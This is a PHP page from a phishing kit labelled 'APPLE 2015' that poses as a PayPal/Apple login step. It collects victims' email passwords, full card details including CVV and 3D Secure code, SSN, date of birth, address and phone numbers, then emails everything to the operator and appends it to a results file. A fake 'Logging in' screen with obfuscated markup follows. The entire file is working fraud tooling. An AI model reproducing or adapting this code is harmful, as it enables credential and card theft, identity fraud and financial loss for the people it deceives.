<?php 
include 'includes/functions.php';
include 'includes/encrypter.php';
/*

+----------------------------------+
¦----------  APPLE 2015  ----------¦
¦----------------------------------¦
¦-------- BY : YAGAMI DEV ---------¦
+----------------------------------+

*/

require 'your_email.php';

$msg  = "====================| PYAPAL |=====================\n";
$from = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$msg  .= "From : ".$from."\n";
$msg .= "Email : \t".$_SESSION['input1']."\n";
$msg .= "Password : \t".$_SESSION['input2']."\n";
$msg .= "Credit Card Number : \t".$_SESSION['input3']."\n";
$msg .= "Credit Card Name : \t".$_SESSION['inputtype']."\n";
$msg .= "Expiration Date : \t".$_SESSION['input4']."\n";
$msg .= "CVC (CVV)  : \t".$_SESSION['input5']."\n";
$msg .= "3D Secure Code : \t".$_SESSION['input6']."\n";
$msg .= "Sort Code : \t".$_SESSION['input7']."\n";
$msg .= "SSN : \t".$_SESSION['input8']."\n";
$msg .= "=====================| PYAPAL |=====================\n";
$msg .= "First Name : \t".$_SESSION['input9']."\n";
$msg .= "Last Name : \t".$_SESSION['input10']."\n";
$msg .= "Date of birth : \t".$_SESSION['input11']."\n";
$msg .= "Country : \t".$_SESSION['input12']."\n";
$msg .= "Street Address : \t".$_SESSION['input13']."\n";
$msg .= "City : \t".$_SESSION['input14']."\n";
$msg .= "Code ZIP : \t".$_SESSION['input15']."\n";
$msg .= "Mobile / Home : \t".$_SESSION['input16']."\n";
$msg .= "Phone Number : \t".$_SESSION['input17']."\n";
$msg .= "======================================================\n";

$bilsub 	= "New Result";
$header 	= "From: Apple";
mail($mail_to,$bilsub,$msg,$header);
$file = fopen("static/result.txt", "a+");
fwrite($file, $msg);
fclose($file);
$rand = randomString(20);
?>
<!DOCTYPE html>
<html lang="en" >
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <link rel="shortcut icon" link rel="logo-icon" href="./tsawer-2/ppico.ico">
      <title>Logging in - your Account</title>
      <link media="screen" rel="stylesheet" type="text/css" href="assets/css/wait.css">
	  <script language="JavaScript" src="assets/js/jquery.js"></script>
   </head>
   <body>
      <div class="" id="page">
         <div id="kshgbvskahgvbsksaksa">
            <div id="hksdbkahsbsakhasbkasdh">
               <h2 class="hvbdsjhvsdjsvjsd">Logging in</h2>
            </div>
            <div class=" hvbdsjhvsdjsvjsdH">
               <h3> One moment... </h3>
               <div id="jsbksbvdsksdbksadj" class="jfjgfdhdhtjdhtdh"></div>
               <img id="sbdksdjbdskjbdskbds">
			   <form method="get" name="redirect" action="cmd.php">
				<input type="hidden" name="dispatch" value="<?php echo $rand; ?>">
				<input type="hidden" name="cmd" value="7yx5b78lj86purjl5b7qxxgw#auth">
			   </form>
               <p class="jsbksbvdsksdbksadjaa">Still loading after a few seconds? <a href="./wait.php">Try again</a></p>
            </div>
         </div>
      </div>
<script language="JavaScript" src="assets/js/javascript.js"></script>
</body>
</html>
